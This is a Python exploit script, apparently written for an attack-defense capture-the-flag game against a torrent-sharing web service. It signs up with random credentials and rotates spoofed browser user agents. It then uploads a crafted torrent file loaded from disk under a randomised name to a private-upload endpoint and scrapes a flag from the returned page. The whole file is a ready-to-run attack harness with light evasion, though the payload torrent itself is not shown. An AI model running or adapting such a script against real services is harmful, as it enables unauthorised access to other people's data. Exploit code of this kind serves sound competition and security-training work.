#!/usr/bin/env python3
import requests
import sys
import random
import re
import string

USER_AGENTS = ['Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
               'Mozilla/5.0 (X11; Linux i686; rv:30.0) Gecko/20100101 Firefox/30.0',
               'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
               'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.39 (KHTML, like Gecko) Version/9.0 Safari/601.1.39']


def get_random_creds():
    return (
        ''.join(random.sample(string.ascii_lowercase + string.ascii_lowercase + string.digits, 8)),
        ''.join(random.sample(string.ascii_lowercase + string.ascii_lowercase + string.digits, 8))
    )

def get_random_ua():
    return random.choice(USER_AGENTS)

class Exploiter(requests.Session):
    def __init__(self, host, port):
        super().__init__()
        self.headers = {
            'User-Agent': get_random_ua()
        }
        self._creds = get_random_creds()

        self._base = 'http://{}:{}'.format(host, port)

    def u(self, a):
        return self._base + a

    def signup(self):
        r = self.post(self.u('/signup'), data={
            'login': self._creds[0],
            'password': self._creds[1],
        })

    def get_filename(self):
        l = len('archlinux-2017.12.01-x86_64')
        return ''.join(random.sample(string.ascii_lowercase + string.ascii_lowercase + string.digits, l)) + '.iso'

    def get_torrent(self):
        with open('exploit.torrent', 'rb') as fp:
            data = fp.read()
        fname = self.get_filename()
        return fname, data.replace(b'archlinux-2017.12.01-x86_64.iso', fname.encode())

    def upload(self):
        r = self.post(self.u('/upload_private'), files={
            'upload_file': self.get_torrent()
        })

        html = r.text
        #print(html, file=sys.stderr)
        m = re.search('<td>([^=<>]+=)</td>', html)
        if not m:
            print(html)
        else:
            flag = m.group(1)
            print(flag)

def main():
    host, port = sys.argv[1:3]
    exploiter = Exploiter(host, port)
    exploiter.signup()
    exploiter.upload()

if __name__ == '__main__':
    main()
